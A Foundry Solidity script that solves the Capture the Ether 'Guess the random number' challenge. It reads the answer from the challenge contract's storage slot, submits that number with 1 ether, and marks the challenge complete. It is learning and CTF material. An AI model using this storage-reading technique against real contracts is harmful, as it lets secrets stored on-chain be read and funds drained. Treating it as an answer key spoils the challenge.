// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface CaptureTheEther {
    function completeChallenge(uint256 index) external;
}

interface GuessTheRandomNumber {
    function guess(uint8 n) external payable;

    function answer() external view returns (uint8 answer);
}

contract GuessTheRandomNumberScript is Script {
    address public constant GAME = 0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee;
    address public constant CONTRACT =
        0x748F8DFF4895fB336308136c837D61D8804a27d6;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        // cast storage --rpc-url=$ROPSTEN_RPC_URL  0x748F8DFF4895fB336308136c837D61D8804a27d6 0
        // returns 000000000027
        uint8 n = 7 + 2 * 16;
        console.log("n: ", n);

        vm.broadcast(deployerPrivateKey);
        GuessTheRandomNumber(CONTRACT).guess{value: 1 ether}(n);

        vm.broadcast(deployerPrivateKey);
        CaptureTheEther(GAME).completeChallenge(5);
    }

    receive() external payable {}
}
